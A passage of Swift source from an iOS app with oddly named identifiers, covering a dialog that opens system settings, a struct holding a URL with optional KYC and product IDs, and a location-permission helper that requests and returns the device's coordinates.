                CedarCommonDialog.driftDismiss()
                if let u = URL(string: UIApplication.openSettingsURLString) {
                    UIApplication.shared.open(u, options: [:], completionHandler: nil)
                }
            }
        )
    }
}

private struct DossManoidPick: Identifiable {
    let id = UUID()
    let url: URL
    let shellKycId: String?
    let shellProductId: String?
    let widely: Bool
    let shellFogSlice: FogReedShell?

    init(url: URL, shellKycId: String? = nil, shellProductId: String? = nil, widely: Bool = false, shellFogSlice: FogReedShell? = nil) {
        self.url = url
        self.shellKycId = shellKycId
        self.shellProductId = shellProductId
        self.widely = widely
        self.shellFogSlice = shellFogSlice
    }
}

private enum ReedStoneLaneResult {
    case reedPoint(String, String)
    case reedFallback
    case reedStop(showDialog: Bool)
}

private final class ReedStoneLane: NSObject, CLLocationManagerDelegate {
    private var reedLeaf: CLLocationManager?
    private var reedNeedLocation = false
    private var reedAfterPrompt = false
    private var reedDone: ((ReedStoneLaneResult) -> Void)?

    func reedAsk(needLocation: Bool, done: @escaping (ReedStoneLaneResult) -> Void) {
        reedNeedLocation = needLocation
        reedAfterPrompt = false
        reedDone = done
        let leaf = CLLocationManager()
        let status = leaf.authorizationStatus
        switch status {
        case .authorizedAlways, .authorizedWhenInUse:
            RiverBuryDrift.shared.reedTap("15")
            reedLeaf = leaf
            leaf.delegate = self
            leaf.desiredAccuracy = kCLLocationAccuracyHundredMeters
            leaf.requestLocation()
        case .notDetermined:
            reedLeaf = leaf
            leaf.delegate = self
            reedAfterPrompt = true
            leaf.requestWhenInUseAuthorization()
        case .denied, .restricted:
            RiverBuryDrift.shared.reedTap("16")
            done(needLocation ? .reedStop(showDialog: true) : .reedFallback)
            reedClear()
        @unknown default:
            done(.reedFallback)
            reedClear()
        }
    }

    func locationManagerDidChangeAuthorization(_ manager: CLLocationManager) {
        let status = manager.authorizationStatus
        switch status {
        case .authorizedAlways, .authorizedWhenInUse:
            RiverBuryDrift.shared.reedTap("15")
            manager.desiredAccuracy = kCLLocationAccuracyHundredMeters
            manager.requestLocation()
        case .denied, .restricted:
            RiverBuryDrift.shared.reedTap("16")
            reedDone?(reedNeedLocation ? .reedStop(showDialog: !reedAfterPrompt) : .reedFallback)
            reedClear()
        case .notDetermined:
            break
        @unknown default:
            reedDone?(.reedFallback)
            reedClear()
        }
    }

    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        guard let leaf = locations.last else {
            reedDone?(.reedFallback)
            reedClear()
            return
        }
        reedDone?(.reedPoint(String(leaf.coordinate.longitude), String(leaf.coordinate.latitude)))
        reedClear()
    }

    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error) {
        reedDone?(.reedFallback)
        reedClear()
    }

    private func reedClear() {
        reedLeaf?.stopUpdatingLocation()
        reedLeaf?.delegate = nil
        reedLeaf = nil
        reedDone = nil
        reedNeedLocation = false
        reedAfterPrompt = false
    }
}
